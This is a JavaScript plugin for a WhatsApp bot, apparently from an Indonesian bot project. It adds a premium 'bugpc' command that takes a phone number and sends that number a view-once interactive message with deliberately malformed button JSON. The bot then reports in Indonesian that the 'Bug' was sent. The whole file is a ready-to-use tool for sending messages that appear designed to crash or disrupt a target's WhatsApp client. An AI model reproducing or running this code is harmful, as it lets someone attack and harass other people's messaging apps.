
import moment from 'moment-timezone'
let time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
let salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = (await import('@adiwajshing/baileys')).default

let handler = async (m, { conn, text, command, usedPrefix }) => {

if (!text) return conn.reply(m.chat, `• *Example :* ${usedPrefix + command} 621111111111`, m)

 let msg = generateWAMessageFromContent(`${text}@s.whatsapp.net`, {
  viewOnceMessage: {
    message: {
      "messageContextInfo": {
        "deviceListMetadata": {},
        "deviceListMetadataVersion": 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: wm
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: wm
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...null,
          title: null,
          subtitle: "EzaBot",
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
                "name": "quick_reply",
                "buttonParamsJson": `{\`display_text\`:\`INFO GROUP\`,\`id\`:\`.infogc\`}`
              },
          ],
        })
      })
    }
  }
}, { quoted: m });
await conn.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
await sleep(3000)
await conn.reply(m.chat, `*Sukses mengirim Bug Tolong Jeda 3 Menit Yah*`, m)
}
handler.help = ['bugpc *<number>*']
handler.tags = ['premium']
handler.premium = true
handler.command = /^(bugpc)$/i

export default handler
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}